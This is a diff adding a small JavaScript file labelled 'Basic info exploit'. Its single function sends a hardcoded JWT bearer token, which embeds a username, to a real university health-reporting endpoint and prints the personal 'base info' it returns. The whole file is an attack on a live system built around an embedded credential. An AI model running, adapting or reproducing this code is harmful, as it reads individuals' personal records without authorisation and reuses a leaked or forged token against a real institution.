@@ -1,0 +1,13 @@
+// Basic info exploit
+
+function fuck() {
+    const headers = new Headers();
+    headers.append("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ6ZW1jaG8iLCJhdWQiOiIiLCJleHAiOjE2MDMxMjc3ODQsImRhdGEiOnsidXNlcm5hbWUiOiIyMDE3NDE0MDIxMzkifX0.bC_y7Fy7IdmbE3gGbbBQAoUQIswcLWAJ44paIfzYpcc");
+    fetch("https://yqfk.dgut.edu.cn/home/base_info/getBaseInfo", {
+        headers: headers,
+    }).then(res => {
+        return res.text();
+    }).then(txt => {
+        console.log(txt);
+    });
+}
